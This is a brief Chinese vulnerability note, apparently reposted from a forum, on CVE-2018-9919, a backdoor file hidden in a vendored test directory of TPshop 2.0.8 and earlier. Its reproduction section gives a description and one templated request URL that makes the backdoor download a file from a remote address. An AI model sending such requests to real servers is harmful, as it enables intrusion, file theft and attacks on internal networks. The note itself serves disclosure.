# （CVE-2018-9919）Thinkphp Shop后门

> 原文：[https://www.zhihuifly.com/t/topic/3181](https://www.zhihuifly.com/t/topic/3181)

# （CVE-2018-9919）Thinkphp Shop后门

## 一、漏洞简介

该漏洞源于/vendor/phpdocumentor/reflection-docblock/tests/phpDocumentor/Reflection/DocBlock/Tag/LinkTagTeet.php可以将文件下载到其他服务器上。远程攻击者可利用该漏洞获取敏感信息，并可能执行命令。

## 二、漏洞影响

Backdoor in Tpshop <= 2.0.8

## 三、复现过程

攻击者可以利用此漏洞来攻击服务器并增加其特权，例如：下载任意文件PS！扫描网络端口PS！信息检测，攻击内部网络易受攻击的服务器。

http://www.0-sec.org/vendor/phpdocumentor/reflection-docblock/tests/phpDocumentor/Reflection/DocBlock/Tag/LinkTagTeet.php?bddlj=save_filename&down_url=download_url&jmmy=decryptpass